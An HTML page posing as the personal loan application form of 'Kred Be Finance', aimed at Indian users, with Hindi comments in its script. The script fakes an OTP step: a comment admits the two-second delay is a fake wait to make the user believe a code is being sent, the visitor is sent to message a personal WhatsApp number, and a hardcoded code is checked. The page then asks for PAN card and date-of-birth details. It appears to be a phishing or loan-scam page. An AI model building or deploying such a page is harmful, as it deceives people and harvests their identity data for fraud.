<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kred Be Finance - Trusted Loan Services</title>
    <style>
        :root { --brand-blue: #002e6e; --bg-light: #f4f7f9; --white: #ffffff; --brand-green: #25D366; --text-gray: #555; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
        body { background-color: var(--bg-light); display: flex; flex-direction: column; min-height: 100vh; }
        header { background-color: var(--brand-blue); color: var(--white); padding: 20px 15px 60px 15px; display: flex; justify-content: space-between; align-items: center; border-bottom-left-radius: 40px; border-bottom-right-radius: 40px; }
        .logo-container img { height: 40px; width: auto; }
        .site-banner img { width: 100%; height: auto; margin-top: -25px; display: block; border-radius: 10px; padding: 0 10px; }
        main { flex: 1; padding: 20px; display: flex; justify-content: center; align-items: flex-start; }
        .card { background: var(--white); padding: 25px; border-radius: 20px; box-shadow: 0 8px 30px rgba(0,0,0,0.08); width: 100%; max-width: 420px; text-align: center; }
        h2 { color: var(--brand-blue); margin-bottom: 25px; font-size: 1.1rem; border-bottom: 2px solid #eee; padding-bottom: 10px; }
        .form-group { text-align: left; margin-bottom: 18px; }
        .form-group label { display: block; margin-bottom: 6px; font-weight: 600; color: var(--text-gray); font-size: 0.85rem; }
        .input-wrapper { display: flex; align-items: center; border: 1.5px solid #ddd; border-radius: 10px; overflow: hidden; }
        .prefix { padding: 12px; background: #f8f9fa; border-right: 1.5px solid #ddd; font-weight: bold; }
        input { border: none; outline: none; padding: 12px; width: 100%; font-size: 1rem; }
        .wa-btn { background-color: var(--brand-green); color: white; border: none; padding: 0 15px; height: 48px; cursor: pointer; font-weight: bold; font-size: 0.7rem; }
        #otp-section, #details-section { display: none; }
        .apply-btn { background-color: var(--brand-blue); color: var(--white); padding: 16px; border-radius: 12px; font-size: 1.1rem; font-weight: bold; width: 100%; border: none; cursor: pointer; margin-top: 10px; }
        footer { padding: 30px 20px; text-align: center; font-size: 0.8rem; color: #777; }
        #status-msg { font-size: 0.75rem; margin-top: 5px; color: var(--brand-blue); font-weight: bold; display: none; }
    </style>
</head>
<body>

    <header>
        <div class="logo-container"><img src="kr.png" alt="Logo"></div>
        <div class="welcome-text">Hi, Guest</div>
    </header>

    <div class="site-banner"><img src="banner.png" alt="Banner"></div>

    <main>
        <div class="card">
            <h2>Personal Loan Application</h2>
            
            <div class="form-group">
                <label>Mobile Number</label>
                <div class="input-wrapper">
                    <span class="prefix">+91</span>
                    <input type="tel" id="mobile" placeholder="Enter Mobile" maxlength="10">
                    <button class="wa-btn" id="main-btn" onclick="startVerification()">Get Code</button>
                </div>
                <p id="status-msg">Sending code request...</p>
            </div>

            <div id="otp-section">
                <div class="form-group">
                    <label>Enter 4-Digit Code received on WhatsApp</label>
                    <div class="input-wrapper">
                        <input type="tel" id="otp-input" placeholder="0000" maxlength="4" style="text-align: center; letter-spacing: 5px;">
                        <button class="wa-btn" style="background: #002e6e;" onclick="verifyManualOTP()">Verify</button>
                    </div>
                </div>
            </div>

            <div id="details-section">
                <div class="form-group">
                    <label>PAN Card / Date of Birth</label>
                    <div class="input-wrapper">
                        <input type="text" id="pan-input" placeholder="Enter Details">
                    </div>
                </div>
                <button class="apply-btn" onclick="finalApply()">Apply Now</button>
            </div>
        </div>
    </main>

    <footer>
        <p>© 2026 Kred Be Finance Pvt. Ltd.</p>
    </footer>

    <script>
        const myWhatsApp = "917850953644"; 
        const secretCode = "7850"; 

        function startVerification() {
            const mobile = document.getElementById('mobile').value;
            if(!/^[6-9]\d{9}$/.test(mobile)) { 
                alert("Kripya sahi number dalein"); 
                return; 
            }

            const btn = document.getElementById('main-btn');
            const status = document.getElementById('status-msg');
            
            btn.disabled = true;
            btn.innerText = "...";
            status.style.display = "block";

            // 2 second ka fake wait taaki user ko lage code ja raha hai
            setTimeout(() => {
                const msg = `Hello Kred Be, mera number ${mobile} verify kijiye aur mujhe application code bhejiye.`;
                const waUrl = `https://wa.me/${myWhatsApp}?text=${encodeURIComponent(msg)}`;
                
                // WhatsApp kholna
                window.location.href = waUrl;

                // Wapas aane par OTP section dikhana
                setTimeout(() => {
                    document.getElementById('otp-section').style.display = 'block';
                    status.innerText = "Check your WhatsApp for code";
                    btn.innerText = "Sent";
                }, 1000);

            }, 2000);
        }

        function verifyManualOTP() {
            const enteredCode = document.getElementById('otp-input').value;
            if(enteredCode === secretCode) {
                alert("Verification Successful!");
                document.getElementById('otp-section').style.display = 'none';
                document.getElementById('status-msg').style.display = 'none';
                document.getElementById('mobile').disabled = true;
                document.getElementById('details-section').style.display = 'block';
            } else {
                alert("Galat Code! Kripya WhatsApp wala code hi dalein.");
            }
        }

        function finalApply() {
            const pan = document.getElementById('pan-input').value;
            if(!pan) { alert("PAN details bhariye"); return; }
            alert("Processing Application...");
            window.location.href = "fillyourdetail.html";
        }
    </script>
</body>
</html>
